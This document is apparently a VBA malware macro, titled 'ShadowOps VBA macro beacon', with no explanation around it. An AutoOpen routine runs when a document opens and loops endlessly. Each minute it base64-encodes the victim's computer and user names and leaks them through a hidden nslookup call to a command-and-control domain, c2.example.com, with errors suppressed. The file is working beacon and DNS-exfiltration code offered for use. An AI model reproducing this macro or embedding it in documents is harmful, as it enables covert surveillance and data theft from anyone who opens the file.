
' ShadowOps VBA macro beacon
Sub AutoOpen()
    Dim sid As String
    sid = Left(CreateObject("Scriptlet.TypeLib").GUID, 8)
    Dim c2 As String
    c2 = "c2.example.com"
    Dim interval As Integer
    interval = 60
    Do While True
        Dim info As String
        info = Environ("COMPUTERNAME") & "|" & Environ("USERNAME")
        Dim b64 As String
        b64 = EncodeB64(info)
        On Error Resume Next
        CreateObject("WScript.Shell").Run "nslookup " & b64 & "." & sid & "." & c2, 0, False
        On Error GoTo 0
        Application.Wait Now + TimeValue("00:01:00")
    Loop
End Sub

Function EncodeB64(s As String) As String
    Dim b() As Byte
    b = StrConv(s, vbFromUnicode)
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument")
    Dim node As Object
    Set node = xml.createElement("b")
    node.DataType = "bin.base64"
    node.nodeTypedValue = b
    EncodeB64 = Replace(Replace(Replace(node.Text, "+", "-"), "/", "_"), "=", "")
End Function
